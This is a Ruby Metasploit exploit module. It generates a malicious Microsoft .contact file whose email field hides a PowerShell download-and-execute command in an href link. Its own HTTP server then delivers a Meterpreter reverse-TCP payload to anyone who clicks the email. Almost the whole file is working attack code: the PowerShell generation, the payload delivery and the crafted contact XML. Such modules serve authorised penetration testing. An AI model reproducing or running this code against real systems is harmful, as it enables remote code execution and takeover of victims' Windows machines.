##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule  < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE

  def initialize(info = {})
      super(update_info(info,
          'Name' => "Microsoft .contact HREF Injection Download and Execute",
          'Description' => %Q{
              This module generates a download and execute powershell
              command to be placed in a Microsoft .contact file. URIs
              are able to be injected into the email field of the contact
              file. Once the email is clicked on, the command will execute. 
          },
          'Author' => [
            'Carter Brainerd (cbrnrd)' # Metasploit module
          ],
          'License' => MSF_LICENSE,

          'Platform' => 'win',
          'Stance' => Msf::Exploit::Stance::Aggressive,
          'Targets' =>
          [
              ['Microsoft Excel', {} ]
          ],
          'DisclosureDate' => '',
          'DefaultTarget' => 0,
          'Payload' => {
              'DisableNops' => true
          },
          'DefaultOptions' => {
              'DisablePayloadHandler' => false,
              'PAYLOAD' => 'windows/meterpreter/reverse_tcp',
              'EXITFUNC' => 'thread'
          }
      ))

      register_options([
          OptString.new('FILENAME', [true, "Filename to save as", "MSF.contact"]),
          OptString.new('EMAIL', [true, "The email to display", "msf@metasploit.com"]),
          OptString.new('FIRSTNAME', [true, "The first name to display", ""]),
          OptString.new('LASTNAME', [true, "The last name to display", ""])
      ])
  end

  def on_request_uri(cli, request)
    if request.raw_uri.to_s.end_with? '.contact'
      print_status("Handling request for .contact from #{cli.peerhost}")
      payload = gen_psh("#{get_uri}", "string")
      data = create_contact(payload)
      send_response(cli, data, 'Content-Type' => 'text/plain')
    else
      print_status("Delivering payload to #{cli.peerhost}...")
      p = regenerate_payload(cli)
      data = cmd_psh_payload(p.encoded,
                       payload_instance.arch.first,
                       remove_comspec: true,
                       exec_in_place: true
      )
      send_response(cli, data, 'Content-Type' => 'application/octet-stream')
    end
  end

  # I might be able to do without this (using cmd_psh_payload() and encode_final_payload() in Msf::Exploit::Powershell)
  def gen_psh(url, *method)
    ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl

    if method.include? 'string'
      download_string = datastore['PSH-Proxy'] ? (Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)) : (Rex::Powershell::PshMethods.download_and_exec_string(url))
    else
      # Random filename to use, if there isn't anything set
      random = "#{rand_text_alphanumeric 8}.exe"
      # Set filename (Use random filename if empty)
      filename = datastore['BinaryEXE-FILENAME'].blank? ? random : datastore['BinaryEXE-FILENAME']

      # Set path (Use %TEMP% if empty)
      path = datastore['BinaryEXE-PATH'].blank? ? "$env:temp" : %Q('#{datastore['BinaryEXE-PATH']}')

      # Join Path and Filename
      file = %Q(echo (#{path}+'\\#{filename}'))

      # Generate download PowerShell command
      download_string = Rex::Powershell::PshMethods.download_run(url, file)
    end

    download_and_run = "#{ignore_cert}#{download_string}"

    # Generate main PowerShell command
    return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)
  end

  def create_contact(cmd)
    content = %Q{
      <?xml version="1.0" encoding="utf-8"?>
      <c:contact c:Version="1"
      xmlns:c="http://schemas.microsoft.com/Contact"
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:MSP2P="http://schemas.microsoft.com/Contact/Extended/MSP2P">
        <c:Extended xsi:nil="true" />
        <c:ContactIDCollection>
          <c:ContactID c:ElementID="1bede823-8f69-4fea-ba3f-db2fa8d01412">
            <c:Value>c10ee943-8411-44ef-a1d3-9cc4c2bcb125</c:Value>
          </c:ContactID>
        </c:ContactIDCollection>
        <c:EmailAddressCollection>
          <c:EmailAddress c:ElementID="8553071d-dcf7-49e7-9132-7dcb06bc9307">
      
            <c:Type>SMTP</c:Type>
            <c:Address>&lt;a
            href="#{cmd}"&gt;#{datastore['EMAIL']}&lt;/a&gt;</c:Address>
            <c:LabelCollection>
              <c:Label>Preferred</c:Label>
            </c:LabelCollection>
          </c:EmailAddress>
          <c:EmailAddress c:ElementID="fb5b96c3-d71e-413a-b024-d6d33d410772"
          xsi:nil="true" c:Version="3"
          c:ModificationDate="2019-01-29T16:14:32Z" />
        </c:EmailAddressCollection>
        <c:NameCollection>
          <c:Name c:ElementID="9a892efa-0d1e-4013-a7aa-3724c9f6b18e">
            <c:FamilyName c:Version="2"
            c:ModificationDate="2019-01-29T16:14:32Z">#{datastore['LASTNAME']}</c:FamilyName>
            <c:FormattedName c:Version="3"
            c:ModificationDate="2019-01-29T16:14:32Z">#{datastore['FIRSTNAME']}
            #{datastore['LASTNAME']}</c:FormattedName>
            <c:GivenName c:Version="2"
            c:ModificationDate="2019-01-29T16:14:32Z">#{datastore['FIRSTNAME']}</c:GivenName>
          </c:Name>
        </c:NameCollection>
        <c:PhotoCollection>
          <c:Photo c:ElementID="fc3a56ae-1691-40f0-acd6-36c5ea920796">
            <c:LabelCollection>
              <c:Label>UserTile</c:Label>
            </c:LabelCollection>
          </c:Photo>
        </c:PhotoCollection>
      </c:contact>
    }
    content
  end

  def primer
    file_create(create_contact(gen_psh("#{get_uri}", 'string')))
  end
end
